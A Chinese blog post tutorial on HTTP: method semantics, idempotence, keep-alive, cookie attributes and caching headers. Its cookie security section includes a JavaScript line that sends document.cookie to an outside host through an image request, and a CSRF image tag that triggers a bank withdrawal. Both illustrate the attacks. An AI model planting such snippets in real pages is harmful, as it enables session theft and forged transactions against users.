---
layout: post
title: HTTP 基础
category: Web
---

* toc
{:toc}

## HTTP 语义

最近做 web 项目发现对 HTTP 的各种方法的语义把握的还是不到位，常见的 HTTP 方法有：GET，POST，PUT，DELETE，PATCH，HEAD，OPTIONS，另外还有一些不常见的 LINK，UNLINK 等，下面对一些常见的 HTTP 方法的语义进行总结如下：


### GET

基于给定的信息或者条件来获取资源。GET 被定义为安全的 HTTP 方法，GET 请求是不应该修改服务器的状态的。

### POST

基于给定的信息来在当前资源的下一级创建一个新的资源。所以 POST 似乎应该作用于一个集合，但由于 HTML 的表单提交只支持 POST 和 GET 方法，所以 POST 方法的很多运用并不符合这一定义。但是 [HTTP 规范](http://tools.ietf.org/html/rfc2616#section-9.5)中 POST 方法可以具有以下功能：

+ 对现有资源的标注
+ 向布告栏，新闻组，邮件列表或者类似的信息的集合发布信息
+ 向数据处理流程提供例如表单提交结果的数据块
+ 通过追加操作来扩充数据库

所以在 form 表单中的提交中使用 POST 也是没有问题的。只是说明一点，POST 方法有时候并不完全符合 `用来创建资源` 这样一个定义。具体的语义要根据实际项目的场景来衡量。


### DELETE

销毁一个资源。当客户端希望让一个资源消失的时候，可以发起一个 DELETE 请求来将服务器中的资源销毁。服务器可以决定是否允许删除。

### PUT

用给定的表述信息替换资源的当前状态。PUT 用于修改资源的状态，服务端会根据用户提供的信息来更新资源的状态，从而让资源的状态和用户描述的一致。同样的 PUT 方法也是幂等的。

PUT 方法，也可以用来创建资源，但是它与 POST 的区别在于 PUT 方法执行多次只会创建一个资源，后续的 PUT 会覆盖之前的资源，但是 POST 会生成多个副本。

### HEAD

获取服务器发送过来的报头信息。HEAD 方法的响应不需要发送任何响应实体，只需要发送 HTTP 报头。

### OPTIONS

获取服务器所能提供的 HTTP 方法列表。OPTIONS 方法用来探索某个资源所支持的所有 HTTP 方法。对于 OPTIONS 的响应的报头中存在一个 Allow 字段，其中列举了服务器支持的方法名。虽然 HTTP 定义了很多种方法，但是服务器可以根据需求支持部分方法。

### PATCH

根据给定的信息修改资源的部分信息，没有提供的关于资源的状态就保持不变。如果只想更新资源的部分信息，然后使用 PUT 发送全部信息就显得有些浪费，这个时候 PATCH 方法可以允许只提供那部分需要更新的内容。

### 补充

#### 幂等性

常常看到人们说幂等这个词语，那么幂等是什么意思呢？

如果某个 HTTP 方法作用于一个资源一次或多次该资源的状态都是一致的，那么称该操作是幂等的。幂等这个概念出自数学，一个数乘以 0 一次或者多次，结果都是 0 ，同样的一个数乘以 1 一次或者多次，结果都是等于该数本身。对于 GET 方法，它是幂等的，相当于乘以 1 。而对于 DELETE 方法，它也是幂等的，相当于乘以 0。即对多个资源 GET 和 DELETE 多次效果都是一样的。

---

## 持久连接

HTTP 协议需要采用 TCP 做数据传输，在 HTTP 的早期版本中，每次 HTTP 通信都要建立一次 TCP 连接。而 TCP 连接需要三次握手，这大大降低了 HTTP 传输的性能。

在 Web 发展的早期，网页中的资源比较少，常常只有一个 html 页面，所以这一矛盾体现的不明显。后来，一个网页中包含几十个图片那是常有的事情，每个资源都需要建立一次 TCP 连接，就相当浪费。

解决方法也能直观，多个 HTTP 请求可以用单个 TCP 连接进行传输。这要求服务器在传输完资源之后，不要断开，而是保持 TCP 连接，因为客户端会利用此 TCP 连接发送第二个 HTTP 请求。

在 `HTTP/1.0` 和 `HTTP/1.1` 中开始支持这种持久连接。其中 `HTTP/1.0` 中需要显式地指定头部：

```
Connection: Keep-Alive
```

才能开启持久连接，在 `HTTP/1.1` 中默认开启持久连接。持久连接需要服务器提供支持，客户端在请求中要求持久连接，即设置 `Keep-Alive`，如果服务器支持持久连接，服务器也就会设定持久连接。 // TODO

### 管线化

支持了持久连接，那么多个请求就可以以管线化的方式发生，即一次性发送多个请求。服务器收到后，会返回多个响应。



## HTTP Cookie

Web 服务常常需要用户进行登录，比如订票、买东西，只有登录了才能和服务器才知道当前客户对应的是哪一个账户。

在 HTTP 协议中，通过 cookie 来标识客户。cookie 是一组记录在客户端的信息，客户端的每次 HTTP 请求都要把 cookie 传给服务器。服务器可以通过 `Set-Cookie` 头部字段设置一条 `cookie`。

如此，在客户首次与服务器建立连接时，服务器可以设置一个 cookie，比如 `name=wang`，下次客户端发起新的请求是就会带上这条 cookie，如此服务器就知客户是谁了。


### 检查cookie是否开启

可以通过 navigator.cookieEnabled 这个属性判断浏览器是否开启了cookie。

### cookie 的属性

#### path

默认的 cookie 只对于他的同级目录和子目录可见，而对于父级目录不可见，比如在 `http://www.example.com/blog/category/index.html` 这个页面创建的 cookie 就不能被 `http://www.example.com/blog/index.html` 访问到。但是他对于 `/category` 目录中的文档是可见的。但是有的时候我希望来自同一个域名下的文档都可以共享 cookie 这个时候就可以将path 属性设置为 `/` 。

#### domain

有的时候子域名间需要共享cookie,这个时候就需要用来 domain 属性。

#### secure

这是一个布尔类型属性，它用来指示cookie以何种形式通过网络传输，如果为 true ，那么必须是 https 协议才能进行传输。

### 保存 cookie

```js
document.cookie = "version="+encodeURIComponent(document.lastModified)
```

cookie 的名值中不允许有`;`出现，所以在存储的时候需要对其进行编码。按上面的方式存储 cookie 的有效期只是在浏览器会话期间，要想延长 cookie 的有效期就需要设置 max-age 属性来指示 cookie 的有效期。（单位为秒）

```
name=value;max-age=seconds
```

需要设置其他属性同样只需要在设置cookie 之前追加在字符串后面就行了

```
;path=path
;domain=domain
;secure
```

要改变 cookie 的值就按同样的方法再次设置就可以了。如果删除一个 cookie 只需将他的 max-age 设置为 0 就可以了。


### cookie 的局限性

为每个 web 服务器保存的 cookie 不能超过20个，单个cookie大小不能超过4KB

### cookie 的分类

#### 1. session cookie

session cookie 没有过期时间，当浏览器关闭后就消失了，浏览器将没有设置过期时间的 cookie 作为 session cookie 来处理。

#### 2. Persistent cookie

Persistent cookie(意为：持久 cookie),这类 cookie 有一个明确的过期时间，在这段时间里面访问 cookie 归属的网站的时候都会携带 cookie ，通常用 cookie 来存储一些用户的访问信息，比如保存用户的登录状态，用户不必每次访问网站都进行登录。

#### 3. Secure cookie

Secure cookie ，这类 cookie 只会在加密传输的情况下携带，比如通过 HTTPs 传输的时候。在通过 HTTP 传输的时候，不会携带设置有 secure 标记的 cookie。

#### 4. HttpOnly cookie

当一个 cookie 被设置为 httpOnly 的以后，这个 cookie 不能被 javascript 这样的脚本语言拿到，只能通过 HTTP 和 HTTPs 传输。


#### 5. Third-party cookie

cookie 的 domain 属性和浏览器地址栏中 domain 一致的 cookie 叫做 first-party cookie， 第三方 cookie 就是其 domain 属性不同于 浏览器地址栏中的 domain 的，这类 cookie 通常是属于第三方广告商的，他们会记录用户的访问习惯，和浏览历史，以此做到准确投放广告。

对于其中的原理，可以举个例子说明：

当你访问 `a.example.com` 这个网站的时候，这个网站中引用了广告商 `ad.com` 的广告，当广告内容被下载后，广告提供商的脚本会设置一个属于 ad.com 的 cookie 。下次当你访问 `b.example.com` 的时候，这个网站的广告也是 `ad.com` 提供的，此时向 `ad.com` 请求广告内容的时候就会携带上次访问 `a.example.com` 的时候设置的 cookie 。

对于现代浏览器都提供了禁止第三方 cookie 的选项。  

### cookie 的注意事项

#### Domain 和 Path

域名和路径定义了一个 cookie 的可见范围，它告诉浏览器这个 cookie 的归属范围。出于安全原因， domain 只能设置为当前域名的上层域名，比如在 `example.com` 下就不能把 cookie 的 domain 设置为 `a.example.com` ，而 `a.example.com`可以设置 cookie 的 domain 为 `example.com`

对于 path ，如果一个 cookie 的 path 为 `/doc` 那么在 ``/doc/` 下面的所有页面都能访问到这个 cookie （前提是 domain 也是满足要求）

#### 跨站脚本 - cookie 盗窃

一个 web 页面中可以包含来自其他站点的 js 脚本，而这些脚本是可以访问到该网站下的 cookie 的，这种情况下这些脚本就可能将 cookie 内容发送出去。比如采用下面方法，将 cookie 发送给 www.foo.com

```javascript
var img = document.createElement(‘img’);
img.src = ‘www.foo.com?’+ ‘text=’ + escape(document.cookie);
```

#### 跨站伪造请求

假如，Mallory 在访问 Bob 的博客的时候在他的博客中留言，其中包含如下内容：

```html
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```

如果 Bob 访问过银行的网站，且其中的 cookie 还没有过期，那么当 Bob 在访问自己的博客的时候，就会加载这幅图片，就会想 `bank.example.com` 发起请求，这样就形成了一次伪造的请求。

### 使用 javascript 操作 cookie

```javascript
util.setCookie = function(name, value, dayToLive, option) {
	var cookie = name + '=' + encodeURIComponent(value);
	if (typeof dayToLive === 'number') {
		cookie += ';max-age=' + (dayToLive * 24 * 60 * 60);
	}
	if (option) {
		for (var key in option) {
			if (key === 'path') {
				cookie += ';path=' + option[key];
			} else if (key === 'domain') {
				cookie += ';domain=' + option[key];
			} else if (key === 'secure') {
				cookie += ';secure';
			}
		}
	}
	document.cookie = cookie;
};

util.getCookie = function(name) {
	var cookie = document.cookie;
	var list = cookie.split(/;\s/);
	for (var i = 0; i < list.length; i++) {
		var pair = list[i].split('=');
		if (pair[0] == name) {
			return decodeURIComponent(pair[1]);
		}
	}
	return null;
};
```

需要注意的是：在  浏览器中 javascript 是拿不到 cookie 的过期时间，path，domain 等信息的，多条 cookie 之间是通过 `; ` 分号和空格分隔开来的，形如：`"name=xiaoming; age=21" ` 所以想要获取 cookie 首先需要使用 `/;\s/` 这样的正则将其分隔开来，然后对每一项，再使用 `=` 分割这样就得到了键值。最后在对结果进行一些转码。

而设置 cookie 的方法则是直接在 document.cookie 上面赋值即可，这不会影响到现有的 cookie （当年我觉得这样会覆盖掉现有的 cookie，其实是并不是这样的），对于 domain 和 path 等信息，可以设置但是不会被访问到。

---

## HTTP 缓存



和计算机存储体系一样，web中也存在着缓存，这些缓存可以让人们不必每次都访问地域上很遥远的web服务器，缓存的存在大大地减缓了网络拥塞。

HTTP 协议中就存在一些首部用于控制缓存，下面一一罗列并讲解：

### 缓存控制

**Cache-Control:max-age=1000**

max-age 定义了文档的最大使用期，从第一次生成文档到文档不再新鲜最大合法存在时间，它是相对于文档的创建时间来说的，单位为秒。

**Expires:Fri,05 Jul 2002,05:00:00 GMT**

指定一个具体的时间，这个时间之后文档就不再有效了。由于客户端设备上的系统时间可能有错误，所以有可能出现意外。

### 再验证

如果已经缓存的文档过期了，这个时候也不意味着它的内容已经发生了变化，这个时候缓存会向服务器发起再验证，缓存会获取一份这个文档新的副本，如果文档没有更新，那么缓存就将这个数据发回客户端，并更新相应的首部信息，包括新的过期时间。

但是如果从原服务器获取文档失败了，那么就不能发送已经过期的缓存了，而是发送错误报文。

#### 用条件方法进行再验证

+ If-Modified-Since:<date>

如果从指定日期后文档被修改了，就执行请求。如果从指定日期后文档没有被修改过，那就会返回一个304 Not Modified 响应，这个时候缓存一般之后发送一些变更过的头部信息。否则就会返回一个200 OK 响应。

+ If-None-Match:<tags>

有些时候仅仅使用最后修改时间来验证是不够的，因为有时候经管文档被修改了，但是修改并不重要到需要全球范围内缓存进行重装，或者尽管修改了，但是内容并没有变化（重写了文档），还有的服务器不能得到文档最后修改时间。为了解决这些问题 HTTP 允许对被称为 **实体标签（ETag）** 的版本标识符来比较。实体标签是附加到文档上的任意的标签。他们可能包含的是文档的版本号或者是序列号等。当发布者修改了文档后，可以修改这些实体标签来说明这是一个新的版本。这样缓存就可以使用 If-None-Match 条件首部来获取文档的新副本了。

```http
// request
GET /about.html HTTP/1.0
If-None-Match:"v2.6","v2.5","v2.4"

// response
HTTP/1.0 304 Not Modified
ETag:"v2.6"
```

#### 何时使用实体标签，何时该使用最后修改时间

如果服务器回送了一个实体标签，那么客户端就必须使用实体标签进行验证。如果服务器只回送了 Last-Modified 客户端就可以使用 If-Not-Midified 来验证。

如果服务器收到的请求既有If-Modified-Since 又有实体标签，那么只有两者都满足，才会回送 304 响应。


### 控制缓存的能力

`Cache-Control:no-store|no-cache|must-revalidate|max-age`

**no-store**

标识为 no-store 的响应，是不会进行缓存的，缓存就像非缓存代理一样向客户端转发该相应，然后删除该对象。

**no-cache**

标识为 no-cache 的响应，并非不会存储在缓存中，只是在与原服务器进行新鲜度验证之前，缓存是不能将其提供给客户端的。也就是说，每次访问该文档，都会进行新鲜度验证。

**max-age**

表示从服务器将文档传来时起，具有多少秒的新鲜时间。

**must-revalidate**

...

### 试探性过期

如果响应首部中没有 expires 和 Cache-Control:max-age 首部，那么缓存就会自己估计一个时间。可能会根据文档的最后修改时间来估计。最近修改的文档很有可能会再次修改，而很久以前修改过的文档很有可能是一份稳定的文档，因此缓存时间可能会较长。

### 客户端的新鲜度限制

对于用户点击 refresh 按钮这样的行为，是会无条件地从原始服务器中获取文档。当然在请求中头中也可以添加 Cache-Control 来限制文档的新鲜度。

```
Cache-Control:max-stale=<s>|min-fresh=<s>|no-cache|max-age|no-store|only-if-cached
```
